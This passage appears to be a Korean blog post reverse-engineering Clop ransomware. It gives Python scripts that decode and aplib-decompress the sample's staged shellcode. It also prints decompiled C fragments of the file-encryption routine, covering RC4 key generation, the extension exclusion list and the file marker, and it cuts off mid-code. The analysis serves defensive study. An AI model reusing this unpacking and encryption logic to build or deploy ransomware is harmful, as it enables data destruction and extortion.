class="number">0x933C</span>)</span><br><span class="line">    shellcode = f.read(<span class="number">1380</span>*<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1380</span>): </span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x4559</span> ^ ROL4(<span class="number">0x4559</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,shellcode[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decoded.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(decode)</span><br></pre></td></tr></table></figure><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><img src="https://user-images.githubusercontent.com/49066484/119485756-68705800-bd92-11eb-8017-231cc6686fbf.png" alt="그림5"></p><p>Step 1에서 추출한 Shellcode를 IDA로 확인한 모습니다. TerminateThread, Virtual..와 같은 문자열이 있는걸 확인할 수 있고 이는 성공적으로 두번째 단계에 들어왔음을 의미한다. </p><p><img src="https://user-images.githubusercontent.com/49066484/119485758-69a18500-bd92-11eb-9a72-f491f7abf3db.png" alt="그림6"></p><p>Step 1에서 인자로 받아온 Kernel32와 GetProcAddress를 통해 필요한 함수 주소를 알아온다. 성공적으로 모든 함수의 주소를 알아 왔다면 VirtualQuery 함수를 호출한다. </p><p><img src="https://user-images.githubusercontent.com/49066484/119487256-1b8d8100-bd94-11eb-926a-0b90e4076009.png" alt="그림7"></p><p>VirtualQuery함수는 프로세스의 특정 메모리의 정보, 권한을 얻어온다. 여기서 <code>lpAddress</code>의 인자 값으로 <code>retaddr</code>이 들어갔는데 이 주소는 Step 1에서 Shellcode 호출 후 다음으로 실행될 주소이다. 이는 이전 Step 의 바이너리의 ImageBase주소의 정보를 얻기 위함으로 예상된다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119488156-30b6df80-bd95-11eb-9bae-185f1498de93.png" alt="그림8"></p><p><code>Line265 269</code>에서 args[2],args[4]만큼의 크기를 VirtualAlloc한다. 여기서 args는 Step 1에서 Shellcode를 호출 할 때의 인자값들로 아래 그림을 참고하면 args[2]는 3번째 인자인 <code>0x19d48</code> args[4]는 5번째 인자인 <code>0x20200</code>임을 알 수 있다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119489985-3f05fb00-bd97-11eb-9792-167a31b8725a.png" alt="그림9"></p><p><img src="https://user-images.githubusercontent.com/49066484/119489986-3f9e9180-bd97-11eb-89be-7d335f941ab5.png" alt="그림10"></p><p>각각 크기로 VirtualAlloc을 한 후, 반복문을 통해 <code>0x19d48</code>만큼 할당한 메모리에 값을 쓴다. 이 과정에서는 Step 1에서 Shellcode를 추출할 때 보였던 코드가 있으며, 이는 다음 단계로 넘어가는 Shellcode를 추출하는 것임을 다시 한 번 예상할 수 있다. Shellcode를 추출 한 후   <code>aplib_decompress</code>을 호출한다. 이때 인자는 <code>0x19d48</code>만큼 할당한 메모리와 <code>0x20200</code>만큼 할당한 메모리가 되는데 추출 한 Shellcode를 decompress하여 해당 내용을 더 큰 메모리에 쓰는 역할을 한다. </p><p>다음 단계로 넘어가기 위해 Step 1과 동일하게 해당 코드를 python으로 구현하였고, 이 때 decompress하는 과정은 아래 모듈을 사용했다.</p><ul><li><a href="https://github.com/snemes/aplib/blob/master/aplib.py">https://github.com/snemes/aplib/blob/master/aplib.py</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">&#x27;APLib&#x27;</span>, <span class="string">&#x27;decompress&#x27;</span>]</span><br><span class="line">__version__ = <span class="string">&#x27;0.6&#x27;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Sandor Nemes&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APLib</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    __slots__ = <span class="string">&#x27;source&#x27;</span>, <span class="string">&#x27;destination&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;bitcount&#x27;</span>, <span class="string">&#x27;strict&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, source, strict=<span class="literal">True</span></span>):</span></span><br><span class="line">        self.source = BytesIO(source)</span><br><span class="line">        self.destination = <span class="built_in">bytearray</span>()</span><br><span class="line">        self.tag = <span class="number">0</span></span><br><span class="line">        self.bitcount = <span class="number">0</span></span><br><span class="line">        self.strict = <span class="built_in">bool</span>(strict)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getbit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># check if tag is empty</span></span><br><span class="line">        self.bitcount -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.bitcount &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># load next tag</span></span><br><span class="line">            self.tag = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">            self.bitcount = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># shift bit out of tag</span></span><br><span class="line">        bit = self.tag &gt;&gt; <span class="number">7</span> &amp; <span class="number">1</span></span><br><span class="line">        self.tag &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bit</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getgamma</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># input gamma2-encoded bits</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            result = (result &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.getbit():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">depack</span>(<span class="params">self</span>):</span></span><br><span class="line">        r0 = -<span class="number">1</span></span><br><span class="line">        lwm = <span class="number">0</span></span><br><span class="line">        done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># first byte verbatim</span></span><br><span class="line">            self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># main decompression loop</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">                <span class="keyword">if</span> self.getbit():</span><br><span class="line">                    <span class="keyword">if</span> self.getbit():</span><br><span class="line">                        <span class="keyword">if</span> self.getbit():</span><br><span class="line">                            offs = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                                offs = (offs &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                self.destination.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                            lwm = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            offs = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = <span class="number">2</span> + (offs &amp; <span class="number">1</span>)</span><br><span class="line">                            offs &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                    self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line">                            lwm = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        offs = self.getgamma()</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> lwm == <span class="number">0</span> <span class="keyword">and</span> offs == <span class="number">2</span>:</span><br><span class="line">                            offs = r0</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">if</span> lwm == <span class="number">0</span>:</span><br><span class="line">                                offs -= <span class="number">3</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                offs -= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            offs &lt;&lt;= <span class="number">8</span></span><br><span class="line">                            offs += <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">32000</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">1280</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs &lt; <span class="number">128</span>:</span><br><span class="line">                                length += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line"></span><br><span class="line">                        lwm = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line">                    lwm = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> (TypeError, IndexError):</span><br><span class="line">            <span class="keyword">if</span> self.strict:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;aPLib decompression error&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(self.destination)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompress</span>(<span class="params">data, strict=<span class="literal">False</span></span>):</span></span><br><span class="line">    packed_size = <span class="literal">None</span></span><br><span class="line">    packed_crc = <span class="literal">None</span></span><br><span class="line">    orig_size = <span class="literal">None</span></span><br><span class="line">    orig_crc = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;AP32&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(data) &gt;= <span class="number">24</span>:</span><br><span class="line">        <span class="comment"># data has an aPLib header</span></span><br><span class="line">        header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(<span class="string">&#x27;=IIIII&#x27;</span>, data, <span class="number">4</span>)</span><br><span class="line">        data = data[header_size : header_size + packed_size]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> packed_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_size != <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> packed_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_crc != crc32(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result = APLib(data, strict=strict).depack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> orig_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_size != <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> orig_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_crc != crc32(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># self-test</span></span><br><span class="line">    data = <span class="string">b&#x27;T\x00he quick\xecb\x0erown\xcef\xaex\x80jumps\xed\xe4veur`t?lazy\xead\xfeg\xc0\x00&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> decompress(data) == <span class="string">b&#x27;The quick brown fox jumps over the lazy dog&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;clop&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0xA8D0</span>)</span><br><span class="line">    data = f.read(<span class="number">0x19d48</span>)</span><br><span class="line">     </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">0x19d48</span>:</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        i = i + <span class="number">2</span></span><br><span class="line">    result += data[i].to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    j = j + <span class="number">1</span></span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result ) // <span class="number">4</span>):</span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x0AE0</span> ^ ROL4(<span class="number">0x0AE0</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,result[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decompress&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decompress(decode))</span><br></pre></td></tr></table></figure><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p><img src="https://user-images.githubusercontent.com/49066484/119491533-fe0ee600-bd98-11eb-8fec-6f0deddb3060.png" alt="그림11"></p><p>세 번째 단계로 들어왔다. 여기에는 악성코드에서 쓰일법한 함수들이 많이 있는 것으로 보아 실제 악성 행위를 하는 코드가 있을 것이다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119492069-9e650a80-bd99-11eb-8f75-b1a39506e900.png" alt="그림12"></p><p>특정 조건을 만족하면 CreateThread함수를 호출한다. 이 때 Thread가 수행하는 함수는 악성 행위를 할 가능성이 높다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119602027-4542b880-be25-11eb-8f55-fdbe8ea87f94.png" alt="그림15"></p><p><code>WNetOpenEum</code>,<code>WNetEenumResource</code>함수 호출로 현재 연결되어있는 네트워크 정보를 알아온다. 그리고 특정 조건이 만족되면 다시 한 번 CreateThread함수를 호출한다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119602538-517b4580-be26-11eb-9501-16d51b87e141.png" alt="그림16"></p><p><code>Crypt</code>로 시작하는 함수들이 보인다. 암호화 관련 코드인 것 같다.  pubKey 문자열을 복사하는데 해당 내용은 아래와 같다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119602903-234a3580-be27-11eb-9b70-5a859c8e043b.png" alt="그림17"></p><ul><li>CryptStringToBinaryA : 포맷된 문자열을 바이트 배열로 변환</li><li>CryptDecodeObjectEx : 변환된 바이트 배열을 구조체 변수로 디코딩</li><li>CryptAcquireContextW :  특정 cryptographic service provider(CSP)에서 원하는 키 컨테이너의 핸들값을 가져옴</li><li>CryptImportPublicKeyInfo : pubkey의 핸들값을 가져옴</li></ul><p>위에서 얻은 Key, 구조체, 핸들 값을 가지고 <code>4014b0()</code>을 호출한다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119604958-eaac5b00-be2a-11eb-9b28-20f86fc67822.png" alt="그림18"></p><p><code>4014b0()</code>에서는 암호화할 path를 확인한다. 조건문에서 <code>compare_hash_file</code>의 반환 값에 따라 LABEL_37로 이동한다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119605228-5db5d180-be2b-11eb-838a-1f6ad410dbb8.png" alt="그림20"></p><p><code>compare_hash_file</code>함수에서는 특정 hash값과 path에 대한 hash값을 비교하여 return 값을 반환한다. 이 는 모든 Windows의 파일을 암호화하게 된다면 정상적인 작동이 어렵기에 Windows 동작에 필요한 특정 파일들을 암호화에서 제외하는 작업이다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119604955-e97b2e00-be2a-11eb-9daa-ee03a1ad117b.png" alt="그림19"></p><p>LABLE_37은 <code>4014b0</code>을 다시 호출하는 것을 확인 할 수 있는데 이는 해당 path의 하위 폴더를 대상으로 재귀적인 호출을 통해 암호화에서 제외하는 작업으로 판단된다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119605813-60fd8d00-be2c-11eb-8d12-0acaac89757a.png" alt="그림21"></p><p>그러고 나서 조건문을 만나는데, 파일 속성이 디렉토리가 아닐 경우, 파일이름이 <code>..</code> , <code>.</code> 가 아닐 경우, 파일 이름이 <code>README_README.txt</code>가 아닐 경우와 추가적으로</p><p><img src="https://user-images.githubusercontent.com/49066484/119606160-01ec4800-be2d-11eb-8c41-ee6a79062579.png" alt="그림22"></p><p>특정 파일의 hash값과 일치 하지 않을 경우 (특정 파일이 아닌경우)</p><p><img src="https://user-images.githubusercontent.com/49066484/119606165-0284de80-be2d-11eb-89a0-fc5b10cfe1b8.png" alt="그림23"></p><p>파일의 확장자가 특정 값이 아닐 경우 (특정 확장자가 아닌경우)에 조건문을 실행하게 된다.<br>여기서 제외되는 확장자는 아래와 같다.</p><pre><code>- .CI0P : 과거 암호화 파일 확장자- .OCX : ActiveX 파일- .DLL : 동적 라이브러리- .EXE : 실행 파일- .SYS : 드라이버 파일- .LNK : 바로가기 파일- .ICO : 아이콘 파일- .INI : 설정파일- .MSI : Installer 파일- .CHM : 도움말 파일- .HLF- .LNG : 언어팩 파일- .TTF : 폰트 파일- .CMD : 배치 파일- .BAT : 배치 파일- .CLLP : 현재 랜섬웨어 암호화 파일</code></pre><p><img src="https://user-images.githubusercontent.com/49066484/119606505-abcbd480-be2d-11eb-8b1d-0f1463e21523.png" alt="그림24"></p><p>조건을 만족하게 되면 앞에서 받아온 암호화 관련 key, 구조체, 핸들값들을 구조체로 만들고 CreateThread를 호출한다. 이 구조체는 CreateThread의 실행 함수의 인자로 쓰이며 해당 함수는 <code>파일을 암호화하는 함수</code>이다.</p><p>파일을 암호화 할 때 파일 크기가 17000보다 작으면, 암호화를 진행하지 않는다.</p><p>파일 크기가 17000보다 크다면,  파일 크기에 따라 두 가지 방법으로 나뉜다. </p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( args-&gt;fileSize &gt; <span class="number">2132432</span> )             <span class="comment">// 파일 크기가 2132432보다 클 때 암호화 루틴</span></span><br><span class="line">   &#123;</span><br><span class="line">     v17 = CreateFileMappingW(v3, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0</span>, <span class="number">2132432u</span>, <span class="number">0</span>);</span><br><span class="line">     NumberOfBytesRead = (DWORD)v17;</span><br><span class="line">     <span class="keyword">if</span> ( !v17 )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">     lpBuffer = MapViewOfFile(v17, <span class="number">6u</span>, <span class="number">0</span>, <span class="number">0x10000</span>u, <span class="number">0x1F89D0</span>u);<span class="comment">// 파일 내용을 메모리에 맵핑</span></span><br><span class="line">     <span class="keyword">if</span> ( !lpBuffer )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br></pre></td></tr></table></figure><p>파일 크기가 2132432보다 크면 CreateFileMapping함수를 호출하는데 이는 파일 크기가 크기 때문에 open,read,write에 대한 오버헤드 역시 커져 메모리에 맵핑 후 수정하는 방식(MMF)을 사용한 것이다.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v18 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">rc4_key = v18;</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    rc4_key[v20++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">  <span class="keyword">while</span> ( v20 &lt; <span class="number">117</span> );</span><br><span class="line">  <span class="keyword">if</span> ( !*rc4_key &amp;&amp; !rc4_key[<span class="number">1</span>] &amp;&amp; !rc4_key[<span class="number">2</span>] &amp;&amp; !rc4_key[<span class="number">3</span>] &amp;&amp; !rc4_key[<span class="number">5</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    qmemcpy(rc4_key, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">    v2 = v33;</span><br><span class="line">  &#125;</span><br><span class="line">  nNumberOfBytesToRead = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>sbox에서 랜덤으로 값을 가져와 rc4_key를 만든다. 만약 조건을 만족하면 고정된 key를 사용하는데 이는 악성코드 제작자가 사용하기 위한 용도일 것이다.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v21 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( WriteFile(v21, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;nNumberOfBytesToRead, <span class="number">0</span>)</span><br><span class="line">  &amp;&amp; (nNumberOfBytesToWrite = <span class="number">0</span>,</span><br><span class="line">      encrypted_key = (BYTE *)VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>),</span><br><span class="line">      v23 = v2-&gt;hKey,</span><br><span class="line">      v28 = (DWORD)encrypted_key,</span><br><span class="line">      encrypt_key(rc4_key, (<span 